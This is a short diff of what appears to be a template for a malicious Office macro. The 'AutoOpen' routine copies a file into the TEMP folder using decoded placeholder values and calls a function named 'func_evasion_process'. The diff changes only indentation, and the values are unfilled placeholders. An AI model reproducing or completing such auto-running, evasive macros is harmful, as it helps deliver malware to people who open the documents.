@@ -14,10 +14,10 @@ Sub AutoOpen()
 	Dim var3 As Integer
 	Dim var4 As String
 	Dim var5 As String
-    Dim var6 As String
+    	Dim var6 As String
 
-    var6 = Environ(decode("[TEMP]")) & "\" & decode("[DST]")
-    FileCopy decode("[SRC]"), var6
+    	var6 = Environ(decode("[TEMP]")) & "\" & decode("[DST]")
+    	FileCopy decode("[SRC]"), var6
 
 	var3 = [int1]
 	var1 = func_evasion_process()
